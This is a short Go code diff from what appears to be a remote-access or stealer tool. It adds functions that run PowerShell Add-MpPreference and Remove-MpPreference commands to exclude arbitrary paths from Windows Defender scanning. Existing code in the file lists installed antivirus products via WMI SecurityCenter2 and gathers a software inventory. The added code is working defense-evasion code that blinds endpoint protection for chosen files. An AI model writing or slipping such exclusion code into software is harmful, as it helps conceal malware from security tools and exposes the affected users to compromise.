@@ -17,6 +17,8 @@ const (
 
 	wmiCommand = "$i=(Get-CimInstance -n root/SecurityCenter2 -cl %s);foreach($v in $i){$v.displayName;$v.productState}"
 	softKeys   = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
+	addExCmd   = "Add-MpPreference -ExclusionPa '%s'"
+	rmExCmd    = "Remove-MpPreference -ExclusionPa '%s'"
 )
 
 type anti struct {
@@ -118,4 +120,14 @@ func SoftwareInfo() string {
 	sort.Strings(s)
 	s = RemoveDuplicates(s)
 	return strings.Join(s, "\n")
+}
+
+func AddDefenderExclusion(path string) error {
+	cmd := fmt.Sprintf(addExCmd, path)
+	return RunPowershell(cmd)
+}
+
+func RemoveDefenderExclusion(path string) error {
+	cmd := fmt.Sprintf(rmExCmd, path)
+	return RunPowershell(cmd)
 }
